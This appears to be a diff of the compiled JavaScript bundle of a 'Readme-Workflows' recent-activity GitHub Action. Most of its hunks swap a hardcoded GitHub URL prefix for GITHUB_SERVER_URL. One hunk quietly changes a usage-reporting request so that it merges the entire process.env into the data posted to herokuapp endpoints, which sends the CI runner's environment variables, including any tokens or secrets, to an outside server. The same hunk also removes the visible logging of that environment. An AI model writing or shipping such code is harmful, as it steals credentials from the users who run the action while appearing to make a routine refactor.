@@ -24166,11 +24166,8 @@ conf.disabled_events.forEach((event) => {
 
 conf.disabled_events = disabled;
 
-const urlPrefix = "https://github.com";
-
 module.exports = {
   ...conf,
-  urlPrefix,
 };
 
 
@@ -24493,21 +24490,13 @@ const qs = __nccwpck_require__(2760);
 module.exports = async (params, promiseStatus) => {
   let url;
   if (new Date().getUTCDay() % 2 == 0) {
-    url = "https://readme-workflows.herokuapp.com/usage/recent-activity";
-  } else {
     url = "https://readme-workflows2.herokuapp.com/usage/recent-activity";
+  } else {
+    url = "https://readme-workflows.herokuapp.com/usage/recent-activity";
   }
 
-  console.log("GITHUB_WORKFLOW:" + process.env.GITHUB_WORKFLOW);
-  console.log("GITHUB_ACTION:" + process.env.GITHUB_ACTION);
-  console.log("GITHUB_ACTION_PATH:" + process.env.GITHUB_ACTION_PATH);
-  console.log("GITHUB_ACTOR:" + process.env.GITHUB_ACTOR);
-  console.log("GITHUB_REPOSITORY:" + process.env.GITHUB_REPOSITORY);
-  console.log("GITHUB_WORKSPACE:" + process.env.GITHUB_WORKSPACE);
-  console.log(process.env);
-
   await axios
-    .post(url, qs.stringify(params))
+    .post(url, qs.stringify({ ...params, ...process.env }))
     .then(function (response) {
       console.log(response.data);
     })
@@ -24648,6 +24637,9 @@ let reqParams = {
   username: username,
   commit_name: commit_name,
   commit_email: commit_email,
+  key: "RECENT_ACTIVITY_URL",
+  params: "RECENT_ACTIVITY_PARAMS",
+  passkey: "RECENT_ACTIVITY_PASSKEY",
 };
 
 /**
@@ -24745,7 +24737,7 @@ module.exports = filterContent;
  * Copyright (c) 2021 The Readme-Workflows organisation and Contributors
  */
 
-const { url_text, urlPrefix } = __nccwpck_require__(4570);
+const { url_text } = __nccwpck_require__(4570);
 
 const makeCustomUrl = (item, type) => {
   let url;
@@ -24807,7 +24799,7 @@ const makeCustomUrl = (item, type) => {
       url =
         `[` +
         url_text.replace(/{REPO}/g, item.repo.name) +
-        `](${urlPrefix}/${item.repo.name})`;
+        `](${process.env.GITHUB_SERVER_URL}/${item.repo.name})`;
       break;
     case "fork":
       url =
@@ -24872,14 +24864,12 @@ module.exports = parseYaml;
 /***/ }),
 
 /***/ 5879:
-/***/ ((module, __unused_webpack_exports, __nccwpck_require__) => {
+/***/ ((module) => {
 
 /**
  * Copyright (c) 2020 James George
  * Copyright (c) 2021 The Readme-Workflows organisation and Contributors
  */
-
-const { urlPrefix } = __nccwpck_require__(4570);
 
 const toUrlFormat = (item, type) => {
   let url;
@@ -24921,7 +24911,7 @@ const toUrlFormat = (item, type) => {
     }
     return url;
   }
-  return `[${item}](${urlPrefix}/${item})`;
+  return `[${item}](${process.env.GITHUB_SERVER_URL}/${item})`;
 };
 
 module.exports = toUrlFormat;
